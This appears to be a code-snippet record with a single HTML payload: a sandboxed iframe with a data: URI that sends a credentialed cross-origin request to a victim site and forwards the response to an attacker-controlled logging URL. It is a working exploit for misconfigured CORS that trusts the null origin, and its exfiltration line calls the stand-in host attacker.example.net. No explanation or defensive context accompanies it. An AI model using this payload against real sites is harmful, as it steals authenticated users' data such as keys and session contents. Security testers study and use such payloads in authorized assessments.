---
id: 0a19b14f-447a-42d1-b8b8-35912343585d
type: code
language: HTML
verified: false
created_at: '2023-04-06T03:55:55.784157+00:00'
updated_at: '2023-04-10T20:21:21.943690+00:00'
---

# Code Snippet 0a19b14f

**Language**: HTML

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```
